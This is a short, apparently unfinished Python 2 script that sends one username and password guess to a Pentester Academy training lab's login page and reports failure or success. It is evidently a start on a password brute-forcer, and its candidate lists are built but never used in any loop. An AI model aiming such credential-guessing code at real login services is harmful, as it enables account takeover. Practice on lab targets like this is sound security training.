import requests
from requests.auth import HTTPBasicAuth

url = 'http://pentesteracademylab.appspot.com/lab/webapp/1'
USERNAME = 'admin@pentesteracademy.com' 
PASSWORD = 'aaaaa'
a = ['x','y','z']
x = ['a','a','a','a','a']
listToTry = [0]*(5*5*5*5*5)
i = 0

listToTry = ''.join(x)	
PASSWORD = 'zzzxy'
requests.get(url)
payload = {'email': USERNAME,'password': PASSWORD}
login_data = dict(username=USERNAME,password=PASSWORD)
p = requests.get(url,params=payload)

i= i+1
if "Failed" in p.content:
	print i,PASSWORD,"Failed"
else:
	print i,PASSWORD,"***************** Sucess **********************"
				

	
	
